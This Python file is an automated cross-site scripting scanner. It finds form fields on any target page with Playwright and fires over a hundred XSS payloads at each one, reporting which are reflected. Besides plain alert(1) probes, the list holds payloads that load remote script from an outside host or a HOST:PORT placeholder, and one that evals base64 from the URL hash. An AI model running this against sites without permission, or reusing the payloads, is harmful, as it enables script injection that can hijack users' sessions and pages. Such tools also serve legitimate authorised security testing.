import requests
from playwright.async_api import async_playwright
import asyncio

async def xss_attack(target_url):
    
    #Combines field detection and XSS vulnerability testing on a target website.

    async def detect_fields(url):

        #Detects input, textarea, and select fields on a web page.

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            page = await browser.new_page()

            try:
                await page.goto(url)
                await page.wait_for_load_state("networkidle")
                selectors = ["input", "textarea", "select", "form"]
                detected_fields = {}

                for selector in selectors:
                    elements = await page.query_selector_all(selector)
                    for element in elements:
                        field_name = await element.get_attribute("name")
                        field_id = await element.get_attribute("id")
                        detected_fields[field_id or field_name or selector] = {
                            "id": field_id,
                            "name": field_name,
                            "tag": selector
                        }
                return detected_fields
            finally:
                await browser.close()

    def test_xss(url, param_name):

        #Tests fields for XSS vulnerabilities using common payloads.
        xss_payloads = [
    "<svg onload=alert(1)>",
    "\"><svg onload=alert(1)//",
    "\"onmouseover=alert(1)//",
    "\"autofocus/onfocus=alert(1)//",
    "'-alert(1)-'",
    "'-alert(1)//",
    "\\'-alert(1)//",
    "</script><svg onload=alert(1)>",
    "<x contenteditable onblur=alert(1)>lose focus!",
    "<x onclick=alert(1)>click this!",
    "<x oncopy=alert(1)>copy this!",
    "<x oncontextmenu=alert(1)>right click this!",
    "<x oncut=alert(1)>copy this!",
    "<x ondblclick=alert(1)>double click this!",
    "<x ondrag=alert(1)>drag this!",
    "<x contenteditable onfocus=alert(1)>focus this!",
    "<x contenteditable oninput=alert(1)>input here!",
    "<x contenteditable onkeydown=alert(1)>press any key!",
    "<x contenteditable onkeypress=alert(1)>press any key!",
    "<x contenteditable onkeyup=alert(1)>press any key!",
    "<x onmousedown=alert(1)>click this!",
    "<x onmousemove=alert(1)>hover this!",
    "<x onmouseout=alert(1)>hover this!",
    "<x onmouseover=alert(1)>hover this!",
    "<x onmouseup=alert(1)>click this!",
    "<x contenteditable onpaste=alert(1)>paste here!",
    "<script>alert(1)//",
    "<script>alert(1)<!–",
    "<script src=//brutelogic.com.br/1.js>",
    "<script src=//3334957647/1>",
    "%3Cx onxxx=alert(1)",
    "<%78 onxxx=1",
    "<x %6Fnxxx=1",
    "<x o%6Exxx=1",
    "<x on%78xx=1",
    "<x onxxx%3D1",
    "<X onxxx=1",
    "<x OnXxx=1",
    "<X OnXxx=1",
    "<x onxxx=1 onxxx=1",
    "<x/onxxx=1",
    "<x%09onxxx=1",
    "<x%0Aonxxx=1",
    "<x%0Conxxx=1",
    "<x%0Donxxx=1",
    "<x%2Fonxxx=1",
    "<x 1='1'onxxx=1",
    "<x 1=\"1\"onxxx=1",
    "<x </onxxx=1",
    "<x 1=\">\" onxxx=1",
    "<http://onxxx%3D1/",
    "<x onxxx=alert(1) 1='",
    "<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>",
    "'onload=alert(1)><svg/1='",
    "'>alert(1)</script><script/1='",
    "*/alert(1)</script><script>/*",
    "*/alert(1)\"'onload=\"/*<svg/1='",
    "`-alert(1)\"'onload=\"`<svg/1='",
    "*/</script>'>alert(1)/*<script/1='",
    "<script>alert(1)</script>",
    "<script src=javascript:alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<a href=javascript:alert(1)>click",
    "<math><brute href=javascript:alert(1)>click",
    "<form action=javascript:alert(1)><input type=submit>",
    "<isindex action=javascript:alert(1) type=submit value=click>",
    "<form><button formaction=javascript:alert(1)>click",
    "<form><input formaction=javascript:alert(1) type=submit value=click>",
    "<form><input formaction=javascript:alert(1) type=image value=click>",
    "<form><input formaction=javascript:alert(1) type=image src=SOURCE>",
    "<isindex formaction=javascript:alert(1) type=submit value=click>",
    "<object data=javascript:alert(1)>",
    "<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>",
    "<svg><script xlink:href=data:,alert(1) />",
    "<math><brute xlink:href=javascript:alert(1)>click",
    "<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>",
    "<html ontouchstart=alert(1)>",
    "<html ontouchend=alert(1)>",
    "<html ontouchmove=alert(1)>",
    "<html ontouchcancel=alert(1)>",
    "<body onorientationchange=alert(1)>",
    "\"><img src=1 onerror=alert(1)>.gif",
    "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>",
    "GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;",
    "<script src=\"data:&comma;alert(1)//",
    "\"><script src=data:&comma;alert(1)//",
    "<script src=\"//brutelogic.com.br&sol;1.js&num;",
    "\"><script src=//brutelogic.com.br&sol;1.js&num;",
    "<link rel=import href=\"data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;\">",
    "\"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;",
    "<base href=//0>",
    "<script/src=\"data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)>",
    "<body onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<body onfocus=alert(1)>",
    "<body onhashchange=alert(1)><a href=#x>click this!#x",
    "<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x",
    "<body onscroll=alert(1)><br><br><br><br>",
    "<body onresize=alert(1)>press F12!",
    "<body onhelp=alert(1)>press F1! (MSIE)",
    "<marquee onstart=alert(1)>",
    "<marquee loop=1 width=0 onfinish=alert(1)>",
    "<audio src onloadstart=alert(1)>",
    "<video onloadstart=alert(1)><source>",
    "<input autofocus onblur=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<form onsubmit=alert(1)><input type=submit>",
    "<select onchange=alert(1)><option>1<option>2",
    "<menu id=x contextmenu=x onshow=alert(1)>right click me!",
    "<Img Src=javascript:alert(1) OnError=location=src>"
        ]

        results = []

        for payload in xss_payloads:
            try:
                response = requests.get(url, params={param_name: payload})
                results.append({
                    "payload": payload,
                    "reflected": payload in response.text
                })
            except requests.exceptions.RequestException as e:
                results.append({"payload": payload, "error": str(e)})
        return results

    # Step 1: Field detection
    fields = await detect_fields(target_url)
    if not fields:
        return {"message": "No fields detected.", "vulnerable": False}

    # Step 2: XSS vulnerability testing
    overall_results = {}
    for field_name in fields:
        results = test_xss(target_url, field_name)
        overall_results[field_name] = results

    # Summarize vulnerabilities
    vulnerable = any(result["reflected"] for field_results in overall_results.values() for result in field_results)
    message = "XSS vulnerabilities detected." if vulnerable else "No XSS vulnerabilities detected."
    return {"message": message, "details": overall_results, "vulnerable": vulnerable}
